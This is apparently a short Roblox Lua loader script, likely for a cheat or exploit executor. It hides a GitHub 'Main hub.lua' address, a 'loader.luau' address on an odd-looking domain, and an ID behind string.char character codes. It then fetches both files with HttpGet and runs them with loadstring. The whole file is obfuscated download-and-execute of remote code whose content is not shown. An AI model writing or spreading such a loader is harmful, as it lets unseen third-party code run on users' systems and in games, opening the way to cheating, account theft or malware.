local _b = string.char
local _g = game.HttpGet
local _l = loadstring

local id = _b(101,54,100,55,53,48,55,102,45,100,97,102,50,45,52,48,52,48,45,56,101,53,102,45,98,50,97,57,49,98,55,49,101,48,50,54)
local url1 = _b(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,87,105,108,108,121,87,111,110,107,97,50,52,55,53,53,119,47,87,118,97,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,77,97,105,110,37,50,48,104,117,98,46,108,117,97)
local url2 = _b(104,116,116,112,115,58,47,47,99,100,110,46,112,114,111,106,101,99,116,45,114,101,126,101,114,115,101,46,111,114,103,47,108,111,97,100,101,114,46,108,117,97,117)

getfenv()["ID"] = id
getfenv()["RUN_AFTER"] = _l(_g(game, url1))

_l(_g(game, url2))()
